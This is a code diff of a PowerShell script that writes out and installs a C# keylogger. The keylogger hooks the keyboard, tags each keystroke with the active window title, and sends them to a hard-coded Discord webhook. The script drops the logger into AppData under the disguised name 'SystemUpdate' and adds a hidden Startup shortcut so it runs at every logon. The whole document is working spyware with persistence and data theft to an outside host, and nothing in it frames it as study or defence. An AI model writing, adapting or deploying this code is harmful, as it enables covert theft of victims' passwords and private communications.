@@ -1,34 +1,43 @@
+# First, save the embedded keylogger C# script to a file
+$scriptDir = "$env:APPDATA\SystemUpdate"
+if (-not (Test-Path $scriptDir)) { New-Item -ItemType Directory -Path $scriptDir | Out-Null }
+$scriptPath = Join-Path $scriptDir 'system_update.ps1'
+
+$discordWebhookUrl = 'https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO'
+
+$keyloggerCode = @"
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Net.Http
 
 Add-Type -TypeDefinition @"
 using System;
-using System.Runtime.InteropServices;
+using System.IO;
 using System.Text;
-using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
 using System.Windows.Forms;
-using System.Net.Http;
+using System.Text.RegularExpressions;
 
 namespace KeyLogger {
     public static class Program {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
+        private static StreamWriter logFile;
         private static HookProc hookProc = HookCallback;
         private static IntPtr hookId = IntPtr.Zero;
+
+        private static string currentContextKey = """";
 
         private static StringBuilder buffer = new StringBuilder();
         private static readonly object bufferLock = new object();
 
-        private static string discordWebhookUrl = "https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO";
+        // Discord webhook URL
+        private static string discordWebhookUrl = """ + $discordWebhookUrl + @""";
 
         [STAThread]
         public static void Main() {
-            System.Timers.Timer sendTimer = new System.Timers.Timer(5000);
-            sendTimer.Elapsed += (s, e) => SendBufferAsync().Wait();
-            sendTimer.AutoReset = true;
-            sendTimer.Enabled = true;
-
+            // logFile is no longer used to save locally
             hookId = SetHook(hookProc);
             Application.Run();
             UnhookWindowsHookEx(hookId);
@@ -44,42 +53,94 @@ namespace KeyLogger {
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                 int vkCode = Marshal.ReadInt32(lParam);
-                string keyStr = ConvertKeyToString(vkCode);
-                if (!string.IsNullOrEmpty(keyStr)) {
-                    lock(bufferLock) {
-                        buffer.Append(keyStr);
+                
+                WindowInfo windowInfo = GetActiveWindowInfo();
+                string newContextKey = windowInfo.Title + "::" + windowInfo.ClassName;
+
+                lock(bufferLock) {
+                    if (newContextKey != currentContextKey) {
+                        currentContextKey = newContextKey;
+                        SendToDiscord($""----- {EscapeForDiscord(currentContextKey)} -----\n"");
+                    }
+
+                    string keyString = ConvertKeyToString(vkCode);
+                    if (!string.IsNullOrEmpty(keyString)) {
+                        SendToDiscord(EscapeForDiscord(keyString));
                     }
                 }
             }
             return CallNextHookEx(hookId, nCode, wParam, lParam);
         }
 
-        private static async Task SendBufferAsync() {
-            string dataToSend;
-            lock(bufferLock) {
-                if (buffer.Length == 0) return;
-                dataToSend = buffer.ToString();
-                buffer.Clear();
-            }
+        private static string EscapeForDiscord(string text) {
+            if (string.IsNullOrEmpty(text)) return """";
+            // Escape characters that may break discord markdown or json
+            text = Regex.Replace(text, @"<", @"\<");
+            text = text.Replace(""`"", ""`"");
+            text = text.Replace(""*"", @"\*"");
+            text = text.Replace(""_"", @"\_"");
+            text = text.Replace(""~"", @"\~");
+            text = text.Replace(@"""", "\""");
+            return text;
+        }
 
+        private static void SendToDiscord(string message) {
             try {
-                using (HttpClient client = new HttpClient()) {
-                    string payload = "{\"content\": \"" + EscapeForJson(dataToSend) + "\"}";
-                    StringContent content = new StringContent(payload, Encoding.UTF8, "application/json");
-                    await client.PostAsync(discordWebhookUrl, content);
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(discordWebhookUrl);
+                request.Method = ""POST"";
+                request.ContentType = ""application/json"";
+                string payload = $""{{\""content\"": \""{message}\""}}""; 
+
+                byte[] byteArray = Encoding.UTF8.GetBytes(payload);
+                request.ContentLength = byteArray.Length;
+
+                using (Stream dataStream = request.GetRequestStream()) {
+                    dataStream.Write(byteArray, 0, byteArray.Length);
+                }
+
+                using (var response = (HttpWebResponse)request.GetResponse()) {
+                    // Optional: do something with response if needed
                 }
             } catch {
-                // Silent failure to avoid disruption
+                // Ignore errors to avoid interrupting keylogging
             }
         }
 
-        private static string EscapeForJson(string s) {
-            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
+        private struct WindowInfo {
+            public string Title;
+            public string ClassName;
+        }
+
+        private static WindowInfo GetActiveWindowInfo() {
+            IntPtr hwnd = GetForegroundWindow();
+            if (hwnd == IntPtr.Zero)
+                return new WindowInfo { Title = ""Unknown"", ClassName = """" };
+
+            uint processId;
+            GetWindowThreadProcessId(hwnd, out processId);
+            string title = """";
+            string className = GetClassName(hwnd);
+
+            if (processId != 0) {
+                try {
+                    Process p = Process.GetProcessById((int)processId);
+                    title = p.MainWindowTitle;
+                    if (string.IsNullOrEmpty(title)) {
+                        title = p.ProcessName;
+                    }
+                } catch {
+                    title = ""Unknown"";
+                }
+            }
+            if (string.IsNullOrEmpty(title)) title = ""Unknown"";
+            if (className == null) className = """";
+
+            return new WindowInfo { Title = title, ClassName = className };
         }
 
         private static string ConvertKeyToString(int vkCode) {
-            bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0; // VK_SHIFT
-            bool capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;   // VK_CAPITAL
+            bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0;
+            bool capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;
 
             if (vkCode >= 0x41 && vkCode <= 0x5A) {
                 char c = (char)vkCode;
@@ -87,60 +148,94 @@ namespace KeyLogger {
                 return upper ? c.ToString() : c.ToString().ToLower();
             }
             if (vkCode >= 0x30 && vkCode <= 0x39) {
-                if (shiftPressed) return ShiftNumberToSymbol((char)vkCode);
-                return ((char)vkCode).ToString();
+                if (shiftPressed) {
+                    return ShiftNumberToSymbol((char)vkCode);
+                } else {
+                    return ((char)vkCode).ToString();
+                }
             }
-            if (vkCode >= 0x60 && vkCode <= 0x69)
+            if (vkCode >= 0x60 && vkCode <= 0x69) {
                 return (vkCode - 0x60).ToString();
-
+            }
             switch (vkCode) {
-                case 0x20: return " ";
-                case 0x0D: return "\n";
-                case 0x09: return "\t";
+                case 0x20: return "" "";
+                case 0x0D: return ""\n"";
+                case 0x09: return ""\t"";
                 case 0x14: return null;
-                case 0xBD: return shiftPressed ? "_" : "-";
-                case 0xBB: return shiftPressed ? "+" : "=";
-                case 0xDB: return shiftPressed ? "{" : "[";
-                case 0xDD: return shiftPressed ? "}" : "]";
-                case 0xDC: return shiftPressed ? "|" : "\\";
-                case 0xBA: return shiftPressed ? ":" : ";";
-                case 0xDE: return shiftPressed ? "\"" : "'";
-                case 0xBC: return shiftPressed ? "<" : ",";
-                case 0xBE: return shiftPressed ? ">" : ".";
-                case 0xBF: return shiftPressed ? "?" : "/";
-                case 0xC0: return shiftPressed ? "~" : "`";
+                case 0xBD: return shiftPressed ? ""_"" : ""-"";
+                case 0xBB: return shiftPressed ? ""+"" : ""="";
+                case 0xDB: return shiftPressed ? ""{"" : ""["";
+                case 0xDD: return shiftPressed ? ""}"" : ""]"";
+                case 0xDC: return shiftPressed ? ""|"" : ""\\"";
+                case 0xBA: return shiftPressed ? "":"":"";"";
+                case 0xDE: return shiftPressed ? ""\"""": ""'"";
+                case 0xBC: return shiftPressed ? ""<"" : "","";
+                case 0xBE: return shiftPressed ? "">"" : ""."";
+                case 0xBF: return shiftPressed ? ""?"" : ""/"";
+                case 0xC0: return shiftPressed ? ""~"" : ""`"";
                 default: return null;
             }
         }
 
         private static string ShiftNumberToSymbol(char number) {
             switch (number) {
-                case '1': return "!";
-                case '2': return "@";
-                case '3': return "#";
-                case '4': return "$";
-                case '5': return "%";
-                case '6': return "^";
-                case '7': return "&";
-                case '8': return "*";
-                case '9': return "(";
-                case '0': return ")";
+                case '1': return ""!"";
+                case '2': return ""@"";
+                case '3': return ""#"";
+                case '4': return ""$"";
+                case '5': return ""%"";
+                case '6': return ""^"";
+                case '7': return ""&"";
+                case '8': return ""*"";
+                case '9': return ""("");
+                case '0': return "")"";
                 default: return number.ToString();
             }
         }
 
-        [DllImport("user32.dll")]
+        private static string GetClassName(IntPtr hwnd) {
+            const int maxlength = 256;
+            StringBuilder classText = new StringBuilder(maxlength);
+            if (GetClassName(hwnd, classText, maxlength) > 0) {
+                return classText.ToString();
+            }
+            return """";
+        }
+
+        [DllImport(""user32.dll"")]
         private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
-        [DllImport("user32.dll")]
+        [DllImport(""user32.dll"")]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-        [DllImport("user32.dll")]
+        [DllImport(""user32.dll"")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-        [DllImport("kernel32.dll")]
+        [DllImport(""kernel32.dll"")]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-        [DllImport("user32.dll")]
+        [DllImport(""user32.dll"")]
+        private static extern IntPtr GetForegroundWindow();
+        [DllImport(""user32.dll"")]
+        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+        [DllImport(""user32.dll"")]
         private static extern short GetKeyState(int nVirtKey);
     }
 }
-"@
+"@ -ReferencedAssemblies System.Windows.Forms
 
 [KeyLogger.Program]::Main()
+"@
+
+Set-Content -Path $scriptPath -Value $keyloggerCode -Encoding UTF8 -Force
+
+# Create startup shortcut
+$startupPath = [Environment]::GetFolderPath('Startup')
+$shortcutPath = Join-Path $startupPath 'SystemUpdate.lnk'
+
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+$shortcut.WorkingDirectory = $scriptDir
+$shortcut.Description = "System Update Keylogger"
+$shortcut.Save()
+
+Write-Output "Keylogger script saved to $scriptPath"
+Write-Output "Startup shortcut created at $shortcutPath"
